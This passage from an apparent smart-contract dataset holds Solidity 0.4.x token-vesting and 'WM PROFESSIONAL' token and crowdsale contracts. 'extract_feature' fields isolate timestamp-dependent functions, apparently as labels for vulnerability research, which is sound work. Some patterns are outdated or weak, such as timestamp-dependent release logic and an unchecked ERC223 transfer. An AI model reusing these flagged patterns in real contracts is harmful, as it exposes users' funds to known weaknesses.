  "content": "pragma solidity ^0.4.23;\ncontract ERC20Basic {\n function totalSupply() public view returns (uint256);\n function balanceOf(address who) public view returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender)\n public view returns (uint256);\n function transferFrom(address from, address to, uint256 value)\n public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(\n address indexed owner,\n address indexed spender,\n uint256 value\n );\n}\nlibrary SafeERC20 {\n function safeTransfer(ERC20Basic token, address to, uint256 value) internal {\n require(token.transfer(to, value));\n }\n function safeTransferFrom(\n ERC20 token,\n address from,\n address to,\n uint256 value\n )\n internal\n {\n require(token.transferFrom(from, to, value));\n }\n function safeApprove(ERC20 token, address spender, uint256 value) internal {\n require(token.approve(spender, value));\n }\n}\ncontract Ownable {\n address public owner;\n event OwnershipRenounced(address indexed previousOwner);\n event OwnershipTransferred(\n address indexed previousOwner,\n address indexed newOwner\n );\n constructor() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) public onlyOwner {\n require(newOwner != address(0));\n emit OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n function renounceOwnership() public onlyOwner {\n emit OwnershipRenounced(owner);\n owner = address(0);\n }\n}\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {\n if (a == 0) {\n return 0;\n }\n c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return a / b;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256 c) {\n c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract TokenVesting is Ownable {\n using SafeMath for uint256;\n using SafeERC20 for ERC20Basic;\n event Released(uint256 amount);\n event Revoked();\n address public beneficiary;\n uint256 public cliff;\n uint256 public start;\n uint256 public duration;\n bool public revocable;\n mapping (address => uint256) public released;\n mapping (address => bool) public revoked;\n constructor(\n address _beneficiary,\n uint256 _start,\n uint256 _cliff,\n uint256 _duration,\n bool _revocable\n )\n public\n {\n require(_beneficiary != address(0));\n require(_cliff <= _duration);\n beneficiary = _beneficiary;\n revocable = _revocable;\n duration = _duration;\n cliff = _start.add(_cliff);\n start = _start;\n }\n function release(ERC20Basic token) public {\n uint256 unreleased = releasableAmount(token);\n require(unreleased > 0);\n released[token] = released[token].add(unreleased);\n token.safeTransfer(beneficiary, unreleased);\n emit Released(unreleased);\n }\n function revoke(ERC20Basic token) public onlyOwner {\n require(revocable);\n require(!revoked[token]);\n uint256 balance = token.balanceOf(this);\n uint256 unreleased = releasableAmount(token);\n uint256 refund = balance.sub(unreleased);\n revoked[token] = true;\n token.safeTransfer(owner, refund);\n emit Revoked();\n }\n function releasableAmount(ERC20Basic token) public view returns (uint256) {\n return vestedAmount(token).sub(released[token]);\n }\n function vestedAmount(ERC20Basic token) public view returns (uint256) {\n uint256 currentBalance = token.balanceOf(this);\n uint256 totalBalance = currentBalance.add(released[token]);\n if (block.timestamp < cliff) {\n return 0;\n } else if (block.timestamp >= start.add(duration) || revoked[token]) {\n return totalBalance;\n } else {\n return totalBalance.mul(block.timestamp.sub(start)).div(duration);\n }\n }\n}",
  "extract_feature": [
    "function vestedAmount(ERC20Basic token) public view returns (uint256) {\nuint256 currentBalance = token.balanceOf(this);\nuint256 totalBalance = currentBalance.add(released[token]);\nif (block.timestamp < cliff) {\nreturn 0;\n} else if (block.timestamp >= start.add(duration) || revoked[token]) {\nreturn totalBalance;\n} else {\nreturn totalBalance.mul(block.timestamp.sub(start)).div(duration);\n}\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaabfa0e1460cdfa1f63"
  },
  "filename": "8555.sol",
  "content": "pragma solidity ^0.4.21;\ncontract ERC20Basic {\n uint256 public totalSupply;\n function balanceOf(address who) public view returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n if (a == 0) {\n return 0;\n }\n uint256 c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a / b;\n return c;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract BasicToken is ERC20Basic {\n using SafeMath for uint256;\n mapping(address => uint256) balances;\n function transfer(address _to, uint256 _value) public returns (bool) {\n require(_to != address(0));\n require(_value <= balances[msg.sender]);\n balances[msg.sender] = balances[msg.sender].sub(_value);\n balances[_to] = balances[_to].add(_value);\n Transfer(msg.sender, _to, _value);\n return true;\n }\n function balanceOf(address _owner) public view returns (uint256 balance) {\n return balances[_owner];\n }\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender) public view returns (uint256);\n function transferFrom(address from, address to, uint256 value) public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n}\ncontract StandardToken is ERC20, BasicToken {\n mapping (address => mapping (address => uint256)) internal allowed;\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {\n require(_to != address(0));\n require(_value <= balances[_from]);\n require(_value <= allowed[_from][msg.sender]);\n balances[_from] = balances[_from].sub(_value);\n balances[_to] = balances[_to].add(_value);\n allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);\n Transfer(_from, _to, _value);\n return true;\n }\n function approve(address _spender, uint256 _value) public returns (bool) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) public view returns (uint256) {\n return allowed[_owner][_spender];\n }\n function increaseApproval(address _spender, uint _addedValue) public returns (bool) {\n allowed[msg.sender][_spender] = allowed[msg.sender][_spender].add(_addedValue);\n Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n function decreaseApproval(address _spender, uint _subtractedValue) public returns (bool) {\n uint oldValue = allowed[msg.sender][_spender];\n if (_subtractedValue > oldValue) {\n allowed[msg.sender][_spender] = 0;\n } else {\n allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue);\n }\n Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n}\ncontract Ownable {\n address public owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n function Ownable() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) public onlyOwner {\n require(newOwner != address(0));\n OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n}\ncontract MintableToken is StandardToken, Ownable {\n event Mint(address indexed to, uint256 amount);\n event MintFinished();\n bool public mintingFinished = false;\n modifier canMint() {\n require(!mintingFinished);\n _;\n }\n function mint(address _to, uint256 _amount) onlyOwner canMint public returns (bool) {\n totalSupply = totalSupply.add(_amount);\n balances[_to] = balances[_to].add(_amount);\n Mint(_to, _amount);\n Transfer(address(0), _to, _amount);\n return true;\n }\n function finishMinting() onlyOwner canMint public returns (bool) {\n mintingFinished = true;\n MintFinished();\n return true;\n }\n}\ncontract FreezableToken is StandardToken {\n mapping (bytes32 => uint64) internal chains;\n mapping (bytes32 => uint) internal freezings;\n mapping (address => uint) internal freezingBalance;\n event Freezed(address indexed to, uint64 release, uint amount);\n event Released(address indexed owner, uint amount);\n function balanceOf(address _owner) public view returns (uint256 balance) {\n return super.balanceOf(_owner) + freezingBalance[_owner];\n }\n function actualBalanceOf(address _owner) public view returns (uint256 balance) {\n return super.balanceOf(_owner);\n }\n function freezingBalanceOf(address _owner) public view returns (uint256 balance) {\n return freezingBalance[_owner];\n }\n function freezingCount(address _addr) public view returns (uint count) {\n uint64 release = chains[toKey(_addr, 0)];\n while (release != 0) {\n count ++;\n release = chains[toKey(_addr, release)];\n }\n }\n function getFreezing(address _addr, uint _index) public view returns (uint64 _release, uint _balance) {\n for (uint i = 0; i < _index + 1; i ++) {\n _release = chains[toKey(_addr, _release)];\n if (_release == 0) {\n return;\n }\n }\n _balance = freezings[toKey(_addr, _release)];\n }\n function freezeTo(address _to, uint _amount, uint64 _until) public {\n require(_to != address(0));\n require(_amount <= balances[msg.sender]);\n balances[msg.sender] = balances[msg.sender].sub(_amount);\n bytes32 currentKey = toKey(_to, _until);\n freezings[currentKey] = freezings[currentKey].add(_amount);\n freezingBalance[_to] = freezingBalance[_to].add(_amount);\n freeze(_to, _until);\n Transfer(msg.sender, _to, _amount);\n emit Freezed(_to, _until, _amount);\n }\n function releaseOnce() public {\n bytes32 headKey = toKey(msg.sender, 0);\n uint64 head = chains[headKey];\n require(head != 0);\n require(uint64(block.timestamp) > head);\n bytes32 currentKey = toKey(msg.sender, head);\n uint64 next = chains[currentKey];\n uint amount = freezings[currentKey];\n delete freezings[currentKey];\n balances[msg.sender] = balances[msg.sender].add(amount);\n freezingBalance[msg.sender] = freezingBalance[msg.sender].sub(amount);\n if (next == 0) {\n delete chains[headKey];\n }\n else {\n chains[headKey] = next;\n delete chains[currentKey];\n }\n emit Released(msg.sender, amount);\n }\n function releaseAll() public returns (uint tokens) {\n uint release;\n uint balance;\n (release, balance) = getFreezing(msg.sender, 0);\n while (release != 0 && block.timestamp > release) {\n releaseOnce();\n tokens += balance;\n (release, balance) = getFreezing(msg.sender, 0);\n }\n }\n function toKey(address _addr, uint _release) internal pure returns (bytes32 result) {\n result = 0x5749534800000000000000000000000000000000000000000000000000000000;\n assembly {\n result := or(result, mul(_addr, 0x10000000000000000))\n result := or(result, _release)\n }\n }\n function freeze(address _to, uint64 _until) internal {\n require(_until > block.timestamp);\n bytes32 key = toKey(_to, _until);\n bytes32 parentKey = toKey(_to, uint64(0));\n uint64 next = chains[parentKey];\n if (next == 0) {\n chains[parentKey] = _until;\n return;\n }\n bytes32 nextKey = toKey(_to, next);\n uint parent;\n while (next != 0 && _until > next) {\n parent = next;\n parentKey = nextKey;\n next = chains[nextKey];\n nextKey = toKey(_to, next);\n }\n if (_until == next) {\n return;\n }\n if (next != 0) {\n chains[key] = next;\n }\n chains[parentKey] = _until;\n }\n}\ncontract ERC223Receiver {\n function tokenFallback(address _from, uint _value, bytes _data) public;\n}\ncontract ERC223Basic is ERC20Basic {\n function transfer(address to, uint value, bytes data) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint value, bytes data);\n}\ncontract SuccessfulERC223Receiver is ERC223Receiver {\n event Invoked(address from, uint value, bytes data);\n function tokenFallback(address _from, uint _value, bytes _data) public {\n emit Invoked(_from, _value, _data);\n }\n}\ncontract FailingERC223Receiver is ERC223Receiver {\n function tokenFallback(address, uint, bytes) public {\n revert();\n }\n}\ncontract ERC223ReceiverWithoutTokenFallback {\n}\ncontract BurnableToken is StandardToken {\n event Burn(address indexed burner, uint256 value);\n function burn(uint256 _value) public {\n require(_value > 0);\n require(_value <= balances[msg.sender]);\n address burner = msg.sender;\n balances[burner] = balances[burner].sub(_value);\n totalSupply = totalSupply.sub(_value);\n Burn(burner, _value);\n }\n}\ncontract Pausable is Ownable {\n event Pause();\n event Unpause();\n bool public paused = false;\n modifier whenNotPaused() {\n require(!paused);\n _;\n }\n modifier whenPaused() {\n require(paused);\n _;\n }\n function pause() onlyOwner whenNotPaused public {\n paused = true;\n Pause();\n }\n function unpause() onlyOwner whenPaused public {\n paused = false;\n Unpause();\n }\n}\ncontract FreezableMintableToken is FreezableToken, MintableToken {\n function mintAndFreeze(address _to, uint _amount, uint64 _until) onlyOwner canMint public returns (bool) {\n totalSupply = totalSupply.add(_amount);\n bytes32 currentKey = toKey(_to, _until);\n freezings[currentKey] = freezings[currentKey].add(_amount);\n freezingBalance[_to] = freezingBalance[_to].add(_amount);\n freeze(_to, _until);\n emit Mint(_to, _amount);\n emit Freezed(_to, _until, _amount);\n emit Transfer(msg.sender, _to, _amount);\n return true;\n }\n}\ncontract Consts {\n uint constant TOKEN_DECIMALS = 18;\n uint8 constant TOKEN_DECIMALS_UINT8 = 18;\n uint constant TOKEN_DECIMAL_MULTIPLIER = 10 ** TOKEN_DECIMALS;\n string constant TOKEN_NAME = \"WM PROFESSIONAL\";\n string constant TOKEN_SYMBOL = \"WMPRO\";\n bool constant PAUSED = false;\n address constant TARGET_USER = 0xf91189AE847537bdb3a12506F7b58492A4308212;\n uint constant START_TIME = 1531692000;\n bool constant CONTINUE_MINTING = false;\n}\ncontract ERC223Token is ERC223Basic, BasicToken, FailingERC223Receiver {\n using SafeMath for uint;\n function transfer(address _to, uint _value, bytes _data) public returns (bool) {\n uint codeLength;\n assembly {\n codeLength := extcodesize(_to)\n }\n balances[msg.sender] = balances[msg.sender].sub(_value);\n balances[_to] = balances[_to].add(_value);\n if(codeLength > 0) {\n ERC223Receiver receiver = ERC223Receiver(_to);\n receiver.tokenFallback(msg.sender, _value, _data);\n }\n emit Transfer(msg.sender, _to, _value, _data);\n return true;\n }\n function transfer(address _to, uint256 _value) public returns (bool) {\n bytes memory empty;\n return transfer(_to, _value, empty);\n }\n}\ncontract MainToken is Consts, FreezableMintableToken, BurnableToken, Pausable\n{\n function name() pure public returns (string _name) {\n return TOKEN_NAME;\n }\n function symbol() pure public returns (string _symbol) {\n return TOKEN_SYMBOL;\n }\n function decimals() pure public returns (uint8 _decimals) {\n return TOKEN_DECIMALS_UINT8;\n }\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool _success) {\n require(!paused);\n return super.transferFrom(_from, _to, _value);\n }\n function transfer(address _to, uint256 _value) public returns (bool _success) {\n require(!paused);\n return super.transfer(_to, _value);\n }\n}",
  "extract_feature": [
    "function releaseOnce() public {\nbytes32 headKey = toKey(msg.sender, 0);\nuint64 head = chains[headKey];\nrequire(head != 0);\nrequire(uint64(block.timestamp) > head);\nbytes32 currentKey = toKey(msg.sender, head);\nuint64 next = chains[currentKey];\nuint amount = freezings[currentKey];\ndelete freezings[currentKey];\nbalances[msg.sender] = balances[msg.sender].add(amount);\nfreezingBalance[msg.sender] = freezingBalance[msg.sender].sub(amount);\nif (next == 0) {\ndelete chains[headKey];\n}\nelse {\nchains[headKey] = next;\ndelete chains[currentKey];\n}\nemit Released(msg.sender, amount);\n}",
    "function releaseAll() public returns (uint tokens) {\nuint release;\nuint balance;\n(release, balance) = getFreezing(msg.sender, 0);\nwhile (release != 0 && block.timestamp > release) {\nreleaseOnce();\ntokens += balance;\n(release, balance) = getFreezing(msg.sender, 0);\n}\n}",
    "function freeze(address _to, uint64 _until) internal {\nrequire(_until > block.timestamp);\nbytes32 key = toKey(_to, _until);\nbytes32 parentKey = toKey(_to, uint64(0));\nuint64 next = chains[parentKey];\nif (next == 0) {\nchains[parentKey] = _until;\nreturn;\n}\nbytes32 nextKey = toKey(_to, next);\nuint parent;\nwhile (next != 0 && _until > next) {\nparent = next;\nparentKey = nextKey;\nnext = chains[nextKey];\nnextKey = toKey(_to, next);\n}\nif (_until == next) {\nreturn;\n}\nif (next != 0) {\nchains[key] = next;\n}\nchains[parentKey] = _until;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaabfa0e1460cdfa1f64"
  },
  "filename": "8556.sol",
  "content": "pragma solidity ^0.4.21;\ncontract ERC20Basic {\n uint256 public totalSupply;\n function balanceOf(address who) public view returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n if (a == 0) {\n return 0;\n }\n uint256 c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a / b;\n return c;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract BasicToken is ERC20Basic {\n using SafeMath for uint256;\n mapping(address => uint256) balances;\n function transfer(address _to, uint256 _value) public returns (bool) {\n require(_to != address(0));\n require(_value <= balances[msg.sender]);\n balances[msg.sender] = balances[msg.sender].sub(_value);\n balances[_to] = balances[_to].add(_value);\n Transfer(msg.sender, _to, _value);\n return true;\n }\n function balanceOf(address _owner) public view returns (uint256 balance) {\n return balances[_owner];\n }\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender) public view returns (uint256);\n function transferFrom(address from, address to, uint256 value) public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n}\ncontract StandardToken is ERC20, BasicToken {\n mapping (address => mapping (address => uint256)) internal allowed;\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {\n require(_to != address(0));\n require(_value <= balances[_from]);\n require(_value <= allowed[_from][msg.sender]);\n balances[_from] = balances[_from].sub(_value);\n balances[_to] = balances[_to].add(_value);\n allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);\n Transfer(_from, _to, _value);\n return true;\n }\n function approve(address _spender, uint256 _value) public returns (bool) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) public view returns (uint256) {\n return allowed[_owner][_spender];\n }\n function increaseApproval(address _spender, uint _addedValue) public returns (bool) {\n allowed[msg.sender][_spender] = allowed[msg.sender][_spender].add(_addedValue);\n Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n function decreaseApproval(address _spender, uint _subtractedValue) public returns (bool) {\n uint oldValue = allowed[msg.sender][_spender];\n if (_subtractedValue > oldValue) {\n allowed[msg.sender][_spender] = 0;\n } else {\n allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue);\n }\n Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n}\ncontract Ownable {\n address public owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n function Ownable() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) public onlyOwner {\n require(newOwner != address(0));\n OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n}\ncontract MintableToken is StandardToken, Ownable {\n event Mint(address indexed to, uint256 amount);\n event MintFinished();\n bool public mintingFinished = false;\n modifier canMint() {\n require(!mintingFinished);\n _;\n }\n function mint(address _to, uint256 _amount) onlyOwner canMint public returns (bool) {\n totalSupply = totalSupply.add(_amount);\n balances[_to] = balances[_to].add(_amount);\n Mint(_to, _amount);\n Transfer(address(0), _to, _amount);\n return true;\n }\n function finishMinting() onlyOwner canMint public returns (bool) {\n mintingFinished = true;\n MintFinished();\n return true;\n }\n}\ncontract Crowdsale {\n using SafeMath for uint256;\n MintableToken public token;\n uint256 public startTime;\n uint256 public endTime;\n address public wallet;\n uint256 public rate;\n uint256 public weiRaised;\n event TokenPurchase(address indexed purchaser, address indexed beneficiary, uint256 value, uint256 amount);\n function Crowdsale(uint256 _startTime, uint256 _endTime, uint256 _rate, address _wallet) public {\n require(_startTime >= now);\n require(_endTime >= _startTime);\n require(_rate > 0);\n require(_wallet != address(0));\n token = createTokenContract();\n startTime = _startTime;\n endTime = _endTime;\n rate = _rate;\n wallet = _wallet;\n }\n function createTokenContract() internal returns (MintableToken) {\n return new MintableToken();\n }\n function () external payable {\n buyTokens(msg.sender);\n }\n function buyTokens(address beneficiary) public payable {\n require(beneficiary != address(0));\n require(validPurchase());\n uint256 weiAmount = msg.value;\n uint256 tokens = weiAmount.mul(rate);\n weiRaised = weiRaised.add(weiAmount);\n token.mint(beneficiary, tokens);\n TokenPurchase(msg.sender, beneficiary, weiAmount, tokens);\n forwardFunds();\n }\n function forwardFunds() internal {\n wallet.transfer(msg.value);\n }\n function validPurchase() internal view returns (bool) {\n bool withinPeriod = now >= startTime && now <= endTime;\n bool nonZeroPurchase = msg.value != 0;\n return withinPeriod && nonZeroPurchase;\n }\n function hasEnded() public view returns (bool) {\n return now > endTime;\n }\n}\ncontract FinalizableCrowdsale is Crowdsale, Ownable {\n using SafeMath for uint256;\n bool public isFinalized = false;\n event Finalized();\n function finalize() onlyOwner public {\n require(!isFinalized);\n require(hasEnded());\n finalization();\n Finalized();\n isFinalized = true;\n }\n function finalization() internal {\n }\n}\ncontract RefundVault is Ownable {\n using SafeMath for uint256;\n enum State { Active, Refunding, Closed }\n mapping (address => uint256) public deposited;\n address public wallet;\n State public state;\n event Closed();\n event RefundsEnabled();\n event Refunded(address indexed beneficiary, uint256 weiAmount);\n function RefundVault(address _wallet) public {\n require(_wallet != address(0));\n wallet = _wallet;\n state = State.Active;\n }\n function deposit(address investor) onlyOwner public payable {\n require(state == State.Active);\n deposited[investor] = deposited[investor].add(msg.value);\n }\n function close() onlyOwner public {\n require(state == State.Active);\n state = State.Closed;\n Closed();\n wallet.transfer(this.balance);\n }\n function enableRefunds() onlyOwner public {\n require(state == State.Active);\n state = State.Refunding;\n RefundsEnabled();\n }\n function refund(address investor) public {\n require(state == State.Refunding);\n uint256 depositedValue = deposited[investor];\n deposited[investor] = 0;\n investor.transfer(depositedValue);\n Refunded(investor, depositedValue);\n }\n}\ncontract FreezableToken is StandardToken {\n mapping (bytes32 => uint64) internal chains;\n mapping (bytes32 => uint) internal freezings;\n mapping (address => uint) internal freezingBalance;\n event Freezed(address indexed to, uint64 release, uint amount);\n event Released(address indexed owner, uint amount);\n function balanceOf(address _owner) public view returns (uint256 balance) {\n return super.balanceOf(_owner) + freezingBalance[_owner];\n }\n function actualBalanceOf(address _owner) public view returns (uint256 balance) {\n return super.balanceOf(_owner);\n }\n function freezingBalanceOf(address _owner) public view returns (uint256 balance) {\n return freezingBalance[_owner];\n }\n function freezingCount(address _addr) public view returns (uint count) {\n uint64 release = chains[toKey(_addr, 0)];\n while (release != 0) {\n count ++;\n release = chains[toKey(_addr, release)];\n }\n }\n function getFreezing(address _addr, uint _index) public view returns (uint64 _release, uint _balance) {\n for (uint i = 0; i < _index + 1; i ++) {\n _release = chains[toKey(_addr, _release)];\n if (_release == 0) {\n return;\n }\n }\n _balance = freezings[toKey(_addr, _release)];\n }\n function freezeTo(address _to, uint _amount, uint64 _until) public {\n require(_to != address(0));\n require(_amount <= balances[msg.sender]);\n balances[msg.sender] = balances[msg.sender].sub(_amount);\n bytes32 currentKey = toKey(_to, _until);\n freezings[currentKey] = freezings[currentKey].add(_amount);\n freezingBalance[_to] = freezingBalance[_to].add(_amount);\n freeze(_to, _until);\n Transfer(msg.sender, _to, _amount);\n emit Freezed(_to, _until, _amount);\n }\n function releaseOnce() public {\n bytes32 headKey = toKey(msg.sender, 0);\n uint64 head = chains[headKey];\n require(head != 0);\n require(uint64(block.timestamp) > head);\n bytes32 currentKey = toKey(msg.sender, head);\n uint64 next = chains[currentKey];\n uint amount = freezings[currentKey];\n delete freezings[currentKey];\n balances[msg.sender] = balances[msg.sender].add(amount);\n freezingBalance[msg.sender] = freezingBalance[msg.sender].sub(amount);\n if (next == 0) {\n delete chains[headKey];\n }\n else {\n chains[headKey] = next;\n delete chains[currentKey];\n }\n emit Released(msg.sender, amount);\n }\n function releaseAll() public returns (uint tokens) {\n uint release;\n uint balance;\n (release, balance) = getFreezing(msg.sender, 0);\n while (release != 0 && block.timestamp > release) {\n releaseOnce();\n tokens += balance;\n (release, balance) = getFreezing(msg.sender, 0);\n }\n }\n function toKey(address _addr, uint _release) internal pure returns (bytes32 result) {\n result = 0x5749534800000000000000000000000000000000000000000000000000000000;\n assembly {\n result := or(result, mul(_addr, 0x10000000000000000))\n result := or(result, _release)\n }\n }\n function freeze(address _to, uint64 _until) internal {\n require(_until > block.timestamp);\n bytes32 key = toKey(_to, _until);\n bytes32 parentKey = toKey(_to, uint64(0));\n uint64 next = chains[parentKey];\n if (next == 0) {\n chains[parentKey] = _until;\n return;\n }\n bytes32 nextKey = toKey(_to, next);\n uint parent;\n while (next != 0 && _until > next) {\n parent = next;\n parentKey = nextKey;\n next = chains[nextKey];\n nextKey = toKey(_to, next);\n }\n if (_until == next) {\n return;\n }\n if (next != 0) {\n chains[key] = next;\n }\n chains[parentKey] = _until;\n }\n}\ncontract ERC223Receiver {\n function tokenFallback(address _from, uint _value, bytes _data) public;\n}\ncontract ERC223Basic is ERC20Basic {\n function transfer(address to, uint value, bytes data) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint value, bytes data);\n}\ncontract SuccessfulERC223Receiver is ERC223Receiver {\n event Invoked(address from, uint value, bytes data);\n function tokenFallback(address _from, uint _value, bytes _data) public {\n emit Invoked(_from, _value, _data);\n }\n}\ncontract FailingERC223Receiver is ERC223Receiver {\n function tokenFallback(address, uint, bytes) public {\n revert();\n }\n}\ncontract ERC223ReceiverWithoutTokenFallback {\n}\ncontract BurnableToken is StandardToken {\n event Burn(address indexed burner, uint256 value);\n function burn(uint256 _value) public {\n require(_value > 0);\n require(_value <= balances[msg.sender]);\n address burner = msg.sender;\n balances[burner] = balances[burner].sub(_value);\n totalSupply = totalSupply.sub(_value);\n Burn(burner, _value);\n }\n}\ncontract Pausable is Ownable {\n event Pause();\n event Unpause();\n bool public paused = false;\n modifier whenNotPaused() {\n require(!paused);\n _;\n }\n modifier whenPaused() {\n require(paused);\n _;\n }\n function pause() onlyOwner whenNotPaused public {\n paused = true;\n Pause();\n }\n function unpause() onlyOwner whenPaused public {\n paused = false;\n Unpause();\n }\n}\ncontract FreezableMintableToken is FreezableToken, MintableToken {\n function mintAndFreeze(address _to, uint _amount, uint64 _until) onlyOwner canMint public returns (bool) {\n totalSupply = totalSupply.add(_amount);\n bytes32 currentKey = toKey(_to, _until);\n freezings[currentKey] = freezings[currentKey].add(_amount);\n freezingBalance[_to] = freezingBalance[_to].add(_amount);\n freeze(_to, _until);\n emit Mint(_to, _amount);\n emit Freezed(_to, _until, _amount);\n emit Transfer(msg.sender, _to, _amount);\n return true;\n }\n}\ncontract Consts {\n uint constant TOKEN_DECIMALS = 18;\n uint8 constant TOKEN_DECIMALS_UINT8 = 18;\n uint constant TOKEN_DECIMAL_MULTIPLIER = 10 ** TOKEN_DECIMALS;\n string constant TOKEN_NAME = \"WM PROFESSIONAL\";\n string constant TOKEN_SYMBOL = \"WMPRO\";\n bool constant PAUSED = false;\n address constant TARGET_USER = 0xf91189AE847537bdb3a12506F7b58492A4308212;\n uint constant START_TIME = 1531692000;\n bool constant CONTINUE_MINTING = false;\n}\ncontract ERC223Token is ERC223Basic, BasicToken, FailingERC223Receiver {\n using SafeMath for uint;\n function transfer(address _to, uint _value, bytes _data) public returns (bool) {\n uint codeLength;\n assembly {\n codeLength := extcodesize(_to)\n }\n balances[msg.sender] = balances[msg.sender].sub(_value);\n balances[_to] = balances[_to].add(_value);\n if(codeLength > 0) {\n ERC223Receiver receiver = ERC223Receiver(_to);\n receiver.tokenFallback(msg.sender, _value, _data);\n }\n emit Transfer(msg.sender, _to, _value, _data);\n return true;\n }\n function transfer(address _to, uint256 _value) public returns (bool) {\n bytes memory empty;\n return transfer(_to, _value, empty);\n }\n}\ncontract MainToken is Consts, FreezableMintableToken, BurnableToken, Pausable\n{\n function name() pure public returns (string _name) {\n return TOKEN_NAME;\n }\n function symbol() pure public returns (string _symbol) {\n return TOKEN_SYMBOL;\n }\n function decimals() pure public returns (uint8 _decimals) {\n return TOKEN_DECIMALS_UINT8;\n }\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool _success) {\n require(!paused);\n return super.transferFrom(_from, _to, _value);\n }\n function transfer(address _to, uint256 _value) public returns (bool _success) {\n require(!paused);\n return super.transfer(_to, _value);\n }\n}\ncontract CappedCrowdsale is Crowdsale {\n using SafeMath for uint256;\n uint256 public cap;\n function CappedCrowdsale(uint256 _cap) public {\n require(_cap > 0);\n cap = _cap;\n }\n function validPurchase() internal view returns (bool) {\n bool withinCap = weiRaised.add(msg.value) <= cap;\n return super.validPurchase() && withinCap;\n }\n function hasEnded() public view returns (bool) {\n bool capReached = weiRaised >= cap;\n return super.hasEnded() || capReached;\n }\n}\ncontract RefundableCrowdsale is FinalizableCrowdsale {\n using SafeMath for uint256;\n uint256 public goal;\n RefundVault public vault;\n function RefundableCrowdsale(uint256 _goal) public {\n require(_goal > 0);\n vault = new RefundVault(wallet);\n goal = _goal;\n }\n function forwardFunds() internal {\n vault.deposit.value(msg.value)(msg.sender);\n }\n function claimRefund() public {\n require(isFinalized);\n require(!goalReached());\n vault.refund(msg.sender);\n }\n function finalization() internal {\n if (goalReached()) {\n vault.close();\n } else {\n vault.enableRefunds();\n }\n super.finalization();\n }\n function goalReached() public view returns (bool) {\n return weiRaised >= goal;\n }\n}\ncontract MainCrowdsale is Consts, FinalizableCrowdsale {\n function hasStarted() public constant returns (bool) {\n return now >= startTime;\n }\n function finalization() internal {\n super.finalization();\n if (PAUSED) {\n MainToken(token).unpause();\n }\n if (!CONTINUE_MINTING) {\n token.finishMinting();\n }\n token.transferOwnership(TARGET_USER);\n }\n function buyTokens(address beneficiary) public payable {\n require(beneficiary != address(0));\n require(validPurchase());\n uint256 weiAmount = msg.value;\n uint256 tokens = weiAmount.mul(rate).div(1 ether);\n weiRaised = weiRaised.add(weiAmount);\n token.mint(beneficiary, tokens);\n emit TokenPurchase(msg.sender, beneficiary, weiAmount, tokens);\n forwardFunds();\n }\n}\ncontract Checkable {\n address private serviceAccount;\n bool private triggered = false;\n event Triggered(uint balance);\n event Checked(bool isAccident);\n function Checkable() public {\n serviceAccount = 